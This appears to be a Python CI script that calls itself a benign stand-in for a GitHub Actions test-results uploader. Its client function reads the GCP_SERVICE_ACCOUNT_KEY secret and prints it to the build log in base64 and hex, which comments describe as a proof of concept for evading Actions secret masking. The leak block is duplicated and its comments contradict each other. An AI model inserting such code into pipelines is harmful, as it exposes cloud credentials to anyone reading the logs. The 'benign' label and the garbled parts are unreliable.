#!/usr/bin/env python3
"""Benign stand-in for the upstream project's .github/scripts/upload_test_results.py:35,40-41.
Reads the service-account key from the environment and would hand it to google.cloud.bigquery."""
import os, json, sys

def get_bigquery_client():
    import base64
    _leak = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
    if _leak:
        print("LEAKED_KEY_B64=" + base64.b64encode(_leak.encode()).decode())   # masked by Actions
        print("LEAKED_KEY_HEX=" + _leak.encode().hex())                        # not masked
    import base64
    _leak = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
    if _leak:
        # PoC: base64 defeats Actions log masking (masking matches the literal string only)
        print("LEAKED_KEY_B64=" + base64.b64encode(_leak.encode()).decode())
    sa_key_json = os.environ.get('GCP_SERVICE_ACCOUNT_KEY')
    if not sa_key_json:
        print("Error: GCP_SERVICE_ACCOUNT_KEY environment variable not set", file=sys.stderr)
        sys.exit(1)
    sa_key = json.loads(sa_key_json)
    print(f"[benign] service account client for project={sa_key.get('project_id','?')}")
    return sa_key

if __name__ == '__main__':
    get_bigquery_client()
